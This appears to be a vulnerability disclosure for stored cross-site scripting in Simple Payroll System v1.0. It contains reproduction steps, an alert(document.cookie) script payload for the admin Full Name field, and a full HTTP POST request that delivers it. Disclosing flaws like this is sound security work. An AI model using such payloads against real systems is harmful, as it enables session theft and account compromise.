# Simple Payroll System v1.0 by oretnom23 has Stored Cross Site Scripting

BUG_Author: lcg22266

vendors:https://www.sourcecodester.com/php/15167/simple-payroll-system-dynamic-tax-bracket-phpoop-and-mysql-free-source-code.html

#### Steps to reproduce

Access url address "http://ip/spms/admin/?page=admin" and Click "Add New"

![image](https://github.com/lcg-22266/bug_pic/blob/main/click.png)

Paste the below payload on Full Name fields and click Save

```
<script>alert(document.cookie)</script>
```

![image](https://github.com/lcg-22266/bug_pic/blob/main/xss.png)

Transmission packet

```
POST /spms/Actions.php?a=save_admin HTTP/1.1
Host: localhost
Content-Length: 80
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/spms/admin/?page=admin
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close

id=&fullname=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&username=a&type=1
```

When visiting http://ip/spms/admin/?page=admin executes payload

![image](https://github.com/lcg-22266/bug_pic/blob/main/session.png)




